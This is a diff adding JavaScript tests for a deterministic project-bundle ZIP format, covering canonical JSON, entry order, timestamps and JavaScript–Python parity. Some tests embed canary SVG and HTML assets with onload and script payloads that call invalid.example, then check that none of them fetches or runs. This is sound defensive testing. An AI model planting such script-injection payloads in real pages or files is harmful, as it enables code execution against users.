@@ -2,10 +2,13 @@ import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
 import { spawnSync } from "node:child_process";
 import test from "node:test";
+import { Uint8ArrayReader, ZipReader } from "@zip.js/zip.js";
 
+import { makeProjectBundle, readProjectBundle } from "../src/v100/core.mjs";
 import { canonicalizeJson } from "../src/v100/project-contract.mjs";
 import {
   bundleDecision,
+  createProjectBundle,
   readProjectBundleArchive,
 } from "../src/v100/project-bundle.mjs";
 
@@ -285,4 +288,127 @@ test("JavaScript and Python return identical stable rejection decisions", async 
   const python = result.stdout.trim().split(/\r?\n/u).map((line) => JSON.parse(line).decision);
   const javascript = await Promise.all(archives.map((archive) => bundleDecision(archive)));
   assert.deepEqual(python, javascript);
+});
+
+test("roundtrips canonical projects and byte-identical opaque assets deterministically", async () => {
+  const canaries = [
+    {
+      id: "active-svg",
+      path: "assets/active.svg",
+      media_type: "image/svg+xml",
+      compression: "deflate",
+      bytes: encoder.encode('<svg onload="fetch(`https://invalid.example/svg`)"><script>globalThis.__assetExecuted=true</script></svg>'),
+    },
+    {
+      id: "active-html",
+      path: "assets/active.html",
+      media_type: "text/html",
+      compression: "store",
+      bytes: encoder.encode('<script type="module">import("https://invalid.example/module.js")</script>'),
+    },
+  ];
+  const project = validProject(canaries);
+  let fetches = 0;
+  const originalFetch = globalThis.fetch;
+  const originalDomParser = globalThis.DOMParser;
+  globalThis.fetch = async () => { fetches += 1; throw new Error("network forbidden"); };
+  globalThis.DOMParser = class ForbiddenDomParser {
+    constructor() { throw new Error("DOM parsing forbidden"); }
+  };
+  try {
+    const first = await createProjectBundle(project, canaries);
+    const second = await createProjectBundle(project, canaries);
+    assert.deepEqual(first, second, "identical inputs must produce byte-identical archives");
+
+    const restored = await readProjectBundleArchive(first);
+    assert.equal(restored.project_bytes.length, encoder.encode(canonicalizeJson(restored.project)).length);
+    assert.equal(decoder.decode(restored.project_bytes), canonicalizeJson(restored.project));
+    assert.deepEqual(restored.assets.map((asset) => asset.path), ["assets/active.html", "assets/active.svg"]);
+    for (const source of canaries) {
+      const asset = restored.assets.find((candidate) => candidate.id === source.id);
+      assert.deepEqual(asset.bytes, source.bytes);
+      assert.equal(asset.sha256, sha256(source.bytes));
+      assert.equal(asset.size, source.bytes.length);
+    }
+    assert.equal(fetches, 0);
+    assert.equal(globalThis.__assetExecuted, undefined);
+  } finally {
+    globalThis.fetch = originalFetch;
+    if (originalDomParser === undefined) delete globalThis.DOMParser;
+    else globalThis.DOMParser = originalDomParser;
+  }
+});
+
+test("writes fixed entry order, timestamps and compression metadata", async () => {
+  const assets = [
+    { id: "z", path: "assets/z.bin", media_type: "application/octet-stream", compression: "store", bytes: Uint8Array.of(0, 1, 2) },
+    { id: "a", path: "assets/a.txt", media_type: "text/plain", compression: "deflate", bytes: encoder.encode("compress me ".repeat(20)) },
+  ];
+  const archive = await createProjectBundle(validProject(assets), assets);
+  const reader = new ZipReader(new Uint8ArrayReader(archive), { strictness: "strict" });
+  try {
+    const entries = await reader.getEntries({ strictness: "strict" });
+    assert.deepEqual(entries.map((entry) => entry.filename), [
+      "manifest.json", "project.json", "assets/a.txt", "assets/z.bin",
+    ]);
+    assert.deepEqual(entries.map((entry) => entry.compressionMethod), [0, 0, 8, 0]);
+    for (const entry of entries) {
+      assert.equal(entry.lastModDate.toISOString(), "1980-01-01T00:00:00.000Z");
+      assert.equal(entry.encrypted, false);
+      assert.equal(entry.directory, false);
+    }
+  } finally {
+    await reader.close();
+  }
+});
+
+test("core compatibility APIs use safe async bundles with opaque assets", async () => {
+  const asset = {
+    id: "core-asset", path: "assets/core.bin", media_type: "application/octet-stream",
+    compression: "store", bytes: Uint8Array.of(0, 255, 1, 254),
+  };
+  const archive = await makeProjectBundle(validProject([asset]), [asset]);
+  const restored = await readProjectBundle(archive, { includeAssets: true });
+  assert.equal(restored.project.schema_version, 2);
+  assert.deepEqual(restored.assets[0].bytes, asset.bytes);
+});
+
+test("JavaScript and Python accept each other's deterministic opaque bundles", async () => {
+  const asset = {
+    id: "parity", path: "assets/parity.svg", media_type: "image/svg+xml",
+    compression: "deflate", bytes: encoder.encode("<svg><script>throw new Error('never')</script></svg>"),
+  };
+  const project = validProject([asset]);
+  const jsArchive = await createProjectBundle(project, [asset]);
+  const request = {
+    id: "read-js",
+    action: "read",
+    raw_base64: Buffer.from(jsArchive).toString("base64"),
+  };
+  const pythonRead = spawnSync("py", [
+    "-3.13", "-m", "custom_components.glt_flow_card.project_bundle", "--json-lines",
+  ], { input: `${JSON.stringify(request)}\n`, encoding: "utf8" });
+  assert.equal(pythonRead.status, 0, pythonRead.stderr);
+  const pythonResult = JSON.parse(pythonRead.stdout).result;
+  assert.equal(Buffer.from(pythonResult.project_base64, "base64").toString("utf8"), canonicalizeJson(pythonResult.project));
+  assert.deepEqual(Buffer.from(pythonResult.assets[0].bytes_base64, "base64"), Buffer.from(asset.bytes));
+
+  const writeRequest = {
+    id: "write-python",
+    action: "write",
+    project,
+    assets: [{ ...asset, bytes: undefined, bytes_base64: Buffer.from(asset.bytes).toString("base64") }],
+  };
+  const first = spawnSync("py", [
+    "-3.13", "-m", "custom_components.glt_flow_card.project_bundle", "--json-lines",
+  ], { input: `${JSON.stringify(writeRequest)}\n`, encoding: "utf8" });
+  const second = spawnSync("py", [
+    "-3.13", "-m", "custom_components.glt_flow_card.project_bundle", "--json-lines",
+  ], { input: `${JSON.stringify(writeRequest)}\n`, encoding: "utf8" });
+  assert.equal(first.status, 0, first.stderr);
+  assert.equal(second.status, 0, second.stderr);
+  assert.equal(JSON.parse(first.stdout).archive_base64, JSON.parse(second.stdout).archive_base64);
+  const restored = await readProjectBundleArchive(Buffer.from(JSON.parse(first.stdout).archive_base64, "base64"));
+  assert.deepEqual(restored.assets[0].bytes, asset.bytes);
+  assert.deepEqual(restored.manifest, pythonResult.manifest);
 });
